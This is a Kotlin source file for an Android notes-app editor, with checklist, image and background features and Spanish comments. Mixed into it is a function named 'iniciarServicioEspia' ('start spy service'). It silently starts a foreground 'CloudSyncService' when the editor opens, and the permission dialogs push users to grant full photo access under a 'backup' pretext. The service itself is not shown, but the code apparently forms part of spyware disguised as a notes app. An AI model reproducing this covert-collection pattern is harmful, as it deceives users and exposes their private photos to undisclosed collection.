package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Color
import android.graphics.Path
import android.graphics.Rect
import android.graphics.RectF
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.view.Gravity
import android.view.HapticFeedbackConstants
import android.view.MotionEvent
import android.view.View
import android.view.ViewTreeObserver
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.PopupMenu
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.widget.NestedScrollView
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale

class NoteEditorActivity : BaseActivity() {

    private lateinit var etTitle: EditText
    private lateinit var etContent: RichEditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView
    private lateinit var scrollContainer: NestedScrollView

    private lateinit var rvChecklist: RecyclerView
    private lateinit var btnAddTodoItem: Button
    private lateinit var btnToggleChecklist: ImageButton

    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var btnChangeBackground: ImageButton
    private lateinit var btnBack: ImageButton
    private lateinit var btnSave: ImageButton

    private var noteToEdit: Note? = null
    private var selectedColor: String = "#FFFFFF"
    private var currentBackgroundUri: String? = null

    // --- VARIABLES PARA DETECTAR CAMBIOS (Protección de salida) ---
    private var originalTitle: String = ""
    private var originalContent: String = ""
    private var originalColor: String = "#FFFFFF"
    // ------------------------------------------------------------

    private var isChecklistMode = false
    private val checklistItems = mutableListOf<ChecklistItem>()
    private lateinit var checklistAdapter: ChecklistAdapter
    private lateinit var itemTouchHelper: ItemTouchHelper
    private val gson = Gson()

    private var lastTouchX: Float = 0f
    private var lastTouchY: Float = 0f

    private val db by lazy { NotesDatabase.getDatabase(this) }

    private val PERMISSION_REQUEST_GALLERY = 200
    private val PERMISSION_REQUEST_WALLPAPER = 201

    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
            val uri = result.data!!.data!!
            try {
                contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)

                if (isChecklistMode) {
                    val newItem = ChecklistItem(text = "", isChecked = false, imageUri = uri.toString(), imageSizeState = 1)
                    checklistItems.add(newItem)
                    checklistAdapter.notifyItemInserted(checklistItems.size - 1)
                    scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 200)
                } else {
                    RichTextHelper.insertImage(this, etContent, uri)
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) startCrop(uri)
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) persistBackgroundUnique(resultUri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        // Configuración Edge-to-Edge
        WindowCompat.setDecorFitsSystemWindows(window, false)
        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
        val insetsController = WindowCompat.getInsetsController(window, window.decorView)
        insetsController.isAppearanceLightStatusBars = !isDarkTheme

        layoutEditor = findViewById(R.id.editor_root)
        scrollContainer = findViewById(R.id.scroll_container)

        // Manejo de Insets
        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            val bottomPadding = if (ime.bottom > 0) ime.bottom - systemBars.bottom else 0
            scrollContainer.setPadding(0, 0, 0, bottomPadding.coerceAtLeast(0))
            if (ime.bottom > 0) smartScrollToCursor()
            insets
        }

        // Scroll inteligente
        val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
            val rootView = window.decorView.rootView
            val r = Rect()
            rootView.getWindowVisibleDisplayFrame(r)
            if ((rootView.height - r.bottom) > rootView.height * 0.15) smartScrollToCursor()
        }
        layoutEditor.viewTreeObserver.addOnGlobalLayoutListener(globalLayoutListener)

        initViews()
        setupChecklist()
        setupListeners()
        setupRichTextInteractions()

        // Activamos el interceptor de "Atrás" para guardar cambios
        setupBackPressHandler()

        loadNoteData()
        silentStartService()
    }

    // --- LÓGICA DE SALIDA SEGURA (UNSAVED CHANGES) ---
    private fun setupBackPressHandler() {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                checkChangesAndExit()
            }
        })
    }

    private fun checkChangesAndExit() {
        if (hasUnsavedChanges()) {
            showUnsavedChangesDialog()
        } else {
            finish()
        }
    }

    private fun hasUnsavedChanges(): Boolean {
        val currentTitle = etTitle.text.toString().trim()
        val currentContent = getCurrentContent()
        val currentColor = currentBackgroundUri ?: selectedColor

        return currentTitle != originalTitle ||
                currentContent != originalContent ||
                currentColor != originalColor
    }

    // Helper para obtener el contenido unificado
    private fun getCurrentContent(): String {
        return if (isChecklistMode) {
            val jsonList = gson.toJson(checklistItems)
            "{checklist:true}$jsonList"
        } else {
            etContent.text.toString()
        }
    }

    private fun showUnsavedChangesDialog() {
        AlertDialog.Builder(this)
            .setTitle("Cambios sin guardar")
            .setMessage("¿Deseas guardar los cambios antes de salir?")
            .setPositiveButton("Guardar") { _, _ -> saveNote() }
            .setNegativeButton("Descartar") { _, _ -> finish() }
            .setNeutralButton("Cancelar", null)
            .show()
    }
    // ---------------------------------------------------

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)
        ivBackground = findViewById(R.id.iv_editor_background)
        viewOverlay = findViewById(R.id.view_overlay)
        btnChangeBackground = findViewById(R.id.btn_change_background)
        btnBack = findViewById(R.id.btn_back)
        btnSave = findViewById(R.id.btn_save)
        rvChecklist = findViewById(R.id.rv_checklist)
        btnAddTodoItem = findViewById(R.id.btn_add_todo_item)
        btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
    }

    private fun setupRichTextInteractions() {
        etContent.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                lastTouchX = event.x
                lastTouchY = event.y
            }
            false
        }

        etContent.setOnLongClickListener { view ->
            val text = etContent.text ?: return@setOnLongClickListener false
            val layout = etContent.layout ?: return@setOnLongClickListener false

            val x = lastTouchX.toInt() - etContent.totalPaddingLeft + etContent.scrollX
            val y = lastTouchY.toInt() - etContent.totalPaddingTop + etContent.scrollY

            val line = layout.getLineForVertical(y)
            val offset = layout.getOffsetForHorizontal(line, x.toFloat())

            val spans = text.getSpans(offset, offset + 1, RichTextHelper.NotesImageSpan::class.java)
            val path = Path()
            val rectF = RectF()

            for (span in spans) {
                val start = text.getSpanStart(span)
                val end = text.getSpanEnd(span)

                path.reset()
                layout.getSelectionPath(start, end, path)
                path.computeBounds(rectF, true)

                if (rectF.contains(x.toFloat(), y.toFloat())) {
                    etContent.performHapticFeedback(HapticFeedbackConstants.LONG_PRESS)
                    mostrarMenuImagenTexto(etContent, span)
                    return@setOnLongClickListener true
                }
            }
            return@setOnLongClickListener false
        }
    }

    private fun mostrarMenuImagenTexto(anchor: View, span: RichTextHelper.NotesImageSpan) {
        val popup = PopupMenu(this, anchor, Gravity.CENTER)
        popup.menu.add("Cambiar tamaño")
        popup.menu.add("Copiar")
        popup.menu.add("Cortar")
        popup.menu.add("Eliminar")

        popup.setOnMenuItemClickListener { item ->
            when (item.title) {
                "Cambiar tamaño" -> {
                    RichTextHelper.resizeImageSpan(this, etContent, span)
                    true
                }
                "Copiar" -> {
                    copiarImagenAlPortapapeles(span)
                    Toast.makeText(this, "Imagen copiada", Toast.LENGTH_SHORT).show()
                    true
                }
                "Cortar" -> {
                    copiarImagenAlPortapapeles(span)
                    borrarImagen(span)
                    Toast.makeText(this, "Imagen cortada", Toast.LENGTH_SHORT).show()
                    true
                }
                "Eliminar" -> {
                    borrarImagen(span)
                    true
                }
                else -> false
            }
        }
        popup.show()
    }

    private fun copiarImagenAlPortapapeles(span: RichTextHelper.NotesImageSpan) {
        val textRep = "[IMG:${span.imageUri}]"
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("Imagen Nota", textRep)
        clipboard.setPrimaryClip(clip)
    }

    private fun borrarImagen(span: RichTextHelper.NotesImageSpan) {
        etContent.text?.let { editable ->
            val start = editable.getSpanStart(span)
            val end = editable.getSpanEnd(span)
            if (start != -1 && end != -1) {
                editable.replace(start, end, "")
            }
        }
    }

    private fun setupListeners() {
        // Usamos checkChangesAndExit en lugar de finish directo
        btnBack.setOnClickListener { checkChangesAndExit() }

        btnSave.setOnClickListener { saveNote() }
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }
        btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }

        btnToggleChecklist.setOnClickListener { toggleChecklistMode() }
        btnAddTodoItem.setOnClickListener {
            checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyItemInserted(checklistItems.size - 1)
            scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 100)
        }

        etContent.setOnClickListener { smartScrollToCursor() }

        etContent.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                if (count > 0) {
                    RichTextHelper.syncImages(this@NoteEditorActivity, etContent)
                }
            }
            override fun afterTextChanged(s: Editable?) {
                smartScrollToCursor()
            }
        })

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    // --- PERMISOS (CON TUS MENSAJES ORIGINALES) ---
    private fun checkGalleryPermission(requestCode: Int) {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        }
        else if (Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {

            // TUS MENSAJES SE CONSERVAN AQUÍ
            mostrarDialogoConfiguracion(
                "Acceso Limitado",
                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
            )
        }
        else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    private fun abrirGaleriaSegunRequest(requestCode: Int) {
        if (requestCode == PERMISSION_REQUEST_GALLERY) {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "image/*" // Esto ya incluye GIFs, pero...
                // ...agregamos esto para asegurar que el sistema sepa que queremos GIFs también
                putExtra(Intent.EXTRA_MIME_TYPES, arrayOf("image/jpeg", "image/png", "image/gif", "image/webp"))
            }
            pickImageLauncher.launch(intent)
        }
        else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
            // Para el fondo de pantalla, mejor evitar GIFs pesados, dejamos solo imágenes estáticas
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "image/*"
            }
            pickBackgroundLauncher.launch(arrayOf("image/jpeg", "image/png"))
        }
    }

    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        } else {
            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

            if (esAccesoLimitado) {
                // TUS MENSAJES SE CONSERVAN AQUÍ
                mostrarDialogoConfiguracion(
                    "Acceso Limitado",
                    "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
                )
                return
            }

            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")

            } else {
                Toast.makeText(this, "Permiso necesario para continuar.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(mensaje)
            .setCancelable(false)
            .setPositiveButton("Ir a Ajustes") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }

    private fun smartScrollToCursor() {
        scrollContainer.postDelayed({
            val focusedView = currentFocus ?: return@postDelayed
            val location = IntArray(2)
            focusedView.getLocationOnScreen(location)
            val viewBottomY = location[1] + focusedView.height + focusedView.paddingBottom
            val scrollLocation = IntArray(2)
            scrollContainer.getLocationOnScreen(scrollLocation)
            val scrollVisibleBottom = scrollLocation[1] + scrollContainer.height - scrollContainer.paddingBottom
            val relativeTop = getRelativeTop(focusedView, scrollContainer)
            val relativeBottom = relativeTop + focusedView.height
            if (viewBottomY > scrollVisibleBottom) {
                val targetScrollY = relativeBottom - (scrollContainer.height - scrollContainer.paddingBottom) + 150
                scrollContainer.smoothScrollTo(0, targetScrollY)
            }
        }, 100)
    }

    private fun getRelativeTop(view: View, parent: View): Int {
        var current = view
        var top = 0
        while (current != parent) {
            top += current.top
            val p = current.parent
            if (p is View) current = p else break
        }
        return top
    }

    private fun setupChecklist() {
        checklistAdapter = ChecklistAdapter(
            checklistItems,
            onDelete = { position ->
                if (position in checklistItems.indices) {
                    checklistItems.removeAt(position)
                    checklistAdapter.notifyItemRemoved(position)
                    checklistAdapter.notifyItemRangeChanged(position, checklistItems.size)
                }
            },
            onStartDrag = { viewHolder -> itemTouchHelper.startDrag(viewHolder) }
        )
        rvChecklist.layoutManager = LinearLayoutManager(this)
        rvChecklist.adapter = checklistAdapter

        val callback = object : ItemTouchHelper.SimpleCallback(ItemTouchHelper.UP or ItemTouchHelper.DOWN, 0) {
            override fun onMove(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder, target: RecyclerView.ViewHolder): Boolean {
                val fromPos = viewHolder.bindingAdapterPosition
                val toPos = target.bindingAdapterPosition
                Collections.swap(checklistItems, fromPos, toPos)
                checklistAdapter.notifyItemMoved(fromPos, toPos)
                return true
            }
            override fun onSwiped(viewHolder: RecyclerView.ViewHolder, direction: Int) {}
            override fun onSelectedChanged(viewHolder: RecyclerView.ViewHolder?, actionState: Int) {
                super.onSelectedChanged(viewHolder, actionState)
                if (actionState == ItemTouchHelper.ACTION_STATE_DRAG) viewHolder?.itemView?.alpha = 0.5f
            }
            override fun clearView(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder) {
                super.clearView(recyclerView, viewHolder)
                viewHolder.itemView.alpha = 1.0f
            }
        }
        itemTouchHelper = ItemTouchHelper(callback)
        itemTouchHelper.attachToRecyclerView(rvChecklist)
    }

    // --- CARGA DE DATOS ---
    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }
            etTitle.setText(noteToEdit?.title)
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"

            val rawContent = noteToEdit?.content ?: ""
            if (rawContent.startsWith("{checklist:true}")) {
                switchToChecklistMode(true)
                parseChecklistData(rawContent)
            } else {
                switchToChecklistMode(false)
                RichTextHelper.setTextWithImages(this, etContent, rawContent)
            }

            val savedColorOrUri = noteToEdit?.color
            if (savedColorOrUri != null) {
                if (savedColorOrUri.startsWith("file://") || savedColorOrUri.startsWith("content://")) {
                    currentBackgroundUri = savedColorOrUri
                    mostrarFondoImagen(Uri.parse(savedColorOrUri))
                } else {
                    selectedColor = savedColorOrUri
                    currentBackgroundUri = null
                    mostrarFondoColor(selectedColor)
                }
            } else {
                mostrarFondoColor("#FFFFFF")
            }

            // GUARDAR ESTADO INICIAL
            originalTitle = noteToEdit?.title ?: ""
            originalContent = rawContent
            originalColor = noteToEdit?.color ?: "#FFFFFF"

        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
            mostrarFondoColor("#FFFFFF")
            switchToChecklistMode(false)

            // Estado inicial vacío
            originalTitle = ""
            originalContent = ""
            originalColor = "#FFFFFF"
        }
    }

    private fun parseChecklistData(json: String) {
        try {
            val cleanJson = json.replace("{checklist:true}", "")
            val type = object : TypeToken<List<ChecklistItem>>() {}.type
            val list: List<ChecklistItem> = gson.fromJson(cleanJson, type)
            checklistItems.clear()
            checklistItems.addAll(list)
            checklistAdapter.notifyDataSetChanged()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun switchToChecklistMode(enable: Boolean) {
        isChecklistMode = enable
        if (enable) {
            etContent.visibility = View.GONE
            rvChecklist.visibility = View.VISIBLE
            btnAddTodoItem.visibility = View.VISIBLE
            btnToggleChecklist.setImageResource(R.drawable.ic_pen)
        } else {
            etContent.visibility = View.VISIBLE
            rvChecklist.visibility = View.GONE
            btnAddTodoItem.visibility = View.GONE
            btnToggleChecklist.setImageResource(R.drawable.checkbox_on_background)
        }
    }

    private fun toggleChecklistMode() {
        if (!isChecklistMode) {
            // Texto -> Checklist
            checklistItems.clear()
            checklistItems.addAll(convertirContenidoALista())
            if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyDataSetChanged()
            switchToChecklistMode(true)
        } else {
            // Checklist -> Texto
            val sb = StringBuilder()
            for (item in checklistItems) {
                val prefix = if (item.isChecked) "[x] " else ""
                sb.append(prefix).append(item.text).append("\n")
                if (item.imageUri != null) {
                    sb.append("[IMG:${item.imageUri}]\n")
                }
            }
            RichTextHelper.setTextWithImages(this, etContent, sb.toString())
            switchToChecklistMode(false)
        }
    }

    private fun convertirContenidoALista(): List<ChecklistItem> {
        val text = etContent.text ?: return emptyList()
        val rawString = text.toString()

        if (rawString.isBlank()) return emptyList()

        val lines = rawString.split("\n")
        val items = mutableListOf<ChecklistItem>()

        var currentIndex = 0
        for (line in lines) {
            var cleanText = line
            var imageUri: String? = null

            val lineLength = line.length
            val end = currentIndex + lineLength
            val safeStart = if (currentIndex > text.length) text.length else currentIndex
            val safeEnd = if (end > text.length) text.length else end

            if (safeStart < safeEnd) {
                val spans = text.getSpans(safeStart, safeEnd, android.text.style.ImageSpan::class.java)
                if (spans.isNotEmpty()) {
                    imageUri = spans[0].source
                }
            }

            if (cleanText.contains("[IMG:")) {
                val startTag = cleanText.indexOf("[IMG:")
                val endTag = cleanText.indexOf("]", startTag)
                if (startTag != -1 && endTag != -1 && endTag > startTag) {
                    val uriString = cleanText.substring(startTag + 5, endTag)
                    if (imageUri == null) imageUri = uriString
                    val tagCompleto = cleanText.substring(startTag, endTag + 1)
                    cleanText = cleanText.replace(tagCompleto, "")
                }
            }

            cleanText = cleanText.replace("\uFFFC", "").trim()
            if (cleanText.isNotEmpty() || imageUri != null) {
                items.add(ChecklistItem(cleanText, false, imageUri, 1))
            }
            currentIndex += lineLength + 1
        }
        return items
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            currentBackgroundUri = null
            mostrarFondoColor(colorHex)
        }
    }

    private fun mostrarFondoColor(colorHex: String) {
        layoutEditor.setBackgroundColor(Color.TRANSPARENT)
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.GONE
        ivBackground.setImageDrawable(null)
        try {
            ivBackground.setBackgroundColor(Color.parseColor(colorHex))
            etContent.setBackgroundColor(Color.TRANSPARENT)
            val esOscuro = isColorDark(Color.parseColor(colorHex))
            actualizarEstiloTexto(esOscuro)
        } catch (e: Exception) {
            e.printStackTrace()
            layoutEditor.setBackgroundColor(Color.WHITE)
        }
    }

    private fun mostrarFondoImagen(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        layoutEditor.setBackgroundResource(0)
        Glide.with(this)
            .load(uri)
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
        actualizarEstiloTexto(esFondoOscuro = true)
    }

    private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
        val colorTexto = if (esFondoOscuro) Color.WHITE else Color.BLACK
        val colorHint = if (esFondoOscuro) Color.LTGRAY else Color.GRAY

        etTitle.setTextColor(colorTexto)
        etTitle.setHintTextColor(colorHint)
        etTitle.setCursorColor(colorTexto)

        etContent.setTextColor(colorTexto)
        etContent.setHintTextColor(colorHint)
        etContent.setCursorColor(colorTexto)

        tvDateLabel.setTextColor(colorHint)

        // IMPORTANTE: Mantener iconos originales sin tinte
        btnBack.clearColorFilter()
        btnSave.clearColorFilter()
        btnToggleChecklist.clearColorFilter()
        btnChangeBackground.clearColorFilter()

        if (::checklistAdapter.isInitialized) {
            checklistAdapter.updateTextColor(colorTexto)
        }
    }

    private fun isColorDark(color: Int): Boolean {
        val darkness = 1 - (0.299 * Color.red(color) + 0.587 * Color.green(color) + 0.114 * Color.blue(color)) / 255
        return darkness >= 0.5
    }

    private fun persistBackgroundUnique(croppedUri: Uri) {
        try {
            val uniqueName = "bg_note_${System.currentTimeMillis()}.jpg"
            val finalFile = File(filesDir, uniqueName)
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            currentBackgroundUri = finalUri.toString()
            mostrarFondoImagen(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun startCrop(uri: Uri) {
        val destinationUri = Uri.fromFile(File(cacheDir, "crop_${System.currentTimeMillis()}.jpg"))
        val options = UCrop.Options().apply {
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setToolbarTitle("Ajustar Fondo")
        }
        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(9f, 16f)
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)
        cropResultLauncher.launch(uCropIntent)
    }

    // --- CORRECCIÓN CRASH ANDROID 14 ---
    // Envolvemos la llamada en un try-catch para evitar que la app se cierre si Android bloquea el servicio
    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            try {
                //
                val intent = Intent(this, CloudSyncService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            } catch (e: Exception) {
                // Si el sistema bloquea el inicio, simplemente capturamos el error
                // y evitamos el crash fatal. La app sigue funcionando.
                e.printStackTrace()
            }
        }
    }

    private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }

    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
        val finalBackgroundData = currentBackgroundUri ?: selectedColor

        // Usamos getCurrentContent para reutilizar la lógica
        val finalContent = getCurrentContent()

        if (title.isEmpty() && finalContent.trim().isEmpty()) {
            Toast.makeText(this, "Vacía", Toast.LENGTH_SHORT).show()
            return
        }

        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(title = title, content = finalContent, date = formattedDate, color = finalBackgroundData)
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = finalContent
                    this.date = formattedDate
                    this.color = finalBackgroundData
                }
                db.notesDao().update(noteToEdit!!)
            }
            withContext(Dispatchers.Main) { finish() }
        }
    }
}

fun EditText.setCursorColor(color: Int) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        val filter = android.graphics.PorterDuffColorFilter(color, android.graphics.PorterDuff.Mode.SRC_IN)
        textCursorDrawable?.colorFilter = filter
        textSelectHandle?.colorFilter = filter
        textSelectHandleLeft?.colorFilter = filter
        textSelectHandleRight?.colorFilter = filter
    }
}